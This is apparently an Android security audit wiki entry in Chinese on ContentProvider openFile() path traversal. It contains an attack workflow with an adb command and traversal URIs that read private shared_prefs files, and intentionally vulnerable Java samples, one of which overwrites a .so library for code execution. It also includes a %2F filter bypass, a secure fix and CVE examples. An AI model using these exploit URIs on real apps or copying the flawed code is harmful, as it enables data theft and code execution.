# 路径遍历

ContentProvider 的 `openFile()` 方法根据 URI 路径返回文件描述符，如果未正确校验路径，攻击者可通过 `../` 遍历访问任意文件。

**Risk: HIGH**


## 利用前提

独立可利用。ContentProvider 的 `openFile()` 方法从 URI 路径构造文件对象但未校验路径边界。攻击者通过 `..%2F` 遍历可读取应用私有目录外的文件。需要 Provider 导出且路径校验缺失。

**Android 版本范围：所有版本可利用** — 应用层逻辑漏洞。


## 攻击流程

```
1. decx ard exported-components → 定位导出 Provider 及 authority
2. decx code class-source <ProviderClass> → 检查 openFile/openAssetFile 是否有路径校验
3. decx code xref-method "package.Provider.openFile(android.net.Uri,java.lang.String):android.os.ParcelFileDescriptor" → 追踪 openFile 调用
4. decx code xref-method "package.Class.getCanonicalPath():java.lang.String" → 追踪路径校验方法
5. 定位 URI path 提取逻辑（getPathSegments/getLastPathSegment/getPath）
6. 检查是否存在 .. 过滤、getCanonicalPath 白名单校验
7. 构造遍历 URI：content://<authority>/..%2F..%2F<target>
8. adb shell content read --uri "content://<authority>/../../../data/data/<pkg>/shared_prefs/config.xml"
```


## 关键特征与代码

- `openFile()` 方法根据 URI 的 path 部分构造文件路径，`..` 序列未过滤或过滤逻辑有缺陷
- `getLastPathSegment()` 会将 `%2F` 解码为 `/`，可绕过简单的 `..` 字符过滤
- `openFile()` 支持写入模式（`"w"`）时，攻击者可覆盖应用私有 `.so` 文件实现代码执行

```java
// 漏洞 1：未校验路径遍历（任意文件读取）
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String filename = uri.getPathSegments().get(0);
    File file = new File(getContext().getFilesDir(), filename);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
// 利用：content://com.app.provider/..%2F..%2F..%2Fdata%2Fdata%2Fcom.app%2Fshared_prefs%2Fconfig.xml

// 漏洞 2：openFile 支持写入模式，可覆盖 .so 文件导致代码执行
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    File file = new File(getContext().getFilesDir(), uri.getLastPathSegment());
    // 未校验路径，且支持 w 模式
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_WRITE);
}
// 利用：content://com.app.provider/..%2F..%2Flib/libnative.so → 覆盖 so 实现 RCE

// 漏洞 3：getLastPathSegment() 自动解码绕过字符过滤
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String segment = uri.getLastPathSegment();
    // 简单过滤 .. 但 getLastPathSegment() 会将 %2F 解码为 /
    // 攻击: content://authority/..%2F..%2Fshared_prefs%2Fsecrets.xml
    // segment 值为: ../../shared_prefs/secrets.xml（已解码）
    if (segment.contains("..")) return null; // 这个过滤可被绕过
    File file = new File(getContext().getFilesDir(), segment);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
```


## 经典案例

| 案例 | 攻击场景 |
|------|----------|
| **CVE-2021-25410** | 三星 CallBGProvider 导出 + 权限 normal + openFile() 目录遍历，任意文件读取 |
| **CVE-2023-20944** | Android 系统 Provider openFile 路径未规范化，跨应用读取私有文件 |
| **sieve.apk** | 密码管理器 Provider 的 openFile 未校验路径，可读取 SharedPreferences |
| **CVE-2021-20722** | 结合 Intent 重定向（setResult 返回可控 Intent）和 FileProvider 路径配置宽泛，系统级文件读写 |


## 安全写法

```java
@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String filename = uri.getPathSegments().get(0);
    File file = new File(getContext().getFilesDir(), filename);
    String canonicalPath = file.getCanonicalPath();
    if (!canonicalPath.startsWith(getContext().getFilesDir().getCanonicalPath())) {
        throw new SecurityException("Path traversal detected");
    }
    // 限制为只读模式，防止写入覆盖
    int modeFlags = ParcelFileDescriptor.MODE_READ_ONLY;
    return ParcelFileDescriptor.open(file, modeFlags);
}
```


## 关联漏洞与组合利用

| 组合 | 链条效果 | 参考文件 |
|------|----------|----------|
| + Activity 路径遍历 | Activity 读取到的文件路径传递给 Provider，进一步扩大访问范围 | → [[app-activity-path-traversal]] |
| + URI 权限授予 | 遍历到的 content:// URI 通过 FLAG_GRANT 授予给恶意应用 | → [[app-intent-uri-permission]] |
| + FileProvider 配置错误 | FileProvider 使用 root-path 配置，路径遍历可访问整个文件系统 | → [[app-provider-fileprovider-misconfig]] |
| + WebView file:// | 遍历读取的文件通过 WebView file:// 协议加载 | → [[app-webview-file-access]] |
| + setResult 泄露 | 遍历获取的文件 URI 通过 setResult 返回给调用方 | → [[app-activity-setresult-leak]] |
| + 写入模式 RCE | openFile("w") + 路径遍历覆盖 lib 目录 .so 文件，实现任意代码执行 | → [[app-provider-call-expose]] |


## Related

- [[app-provider-call-expose]]
- [[app-provider-data-leak]]
- [[app-provider-gettype-infoleak]]

- [[app-activity]]
- [[app-activity-path-traversal]]
- [[app-intent-uri-permission]]
- [[app-provider]]
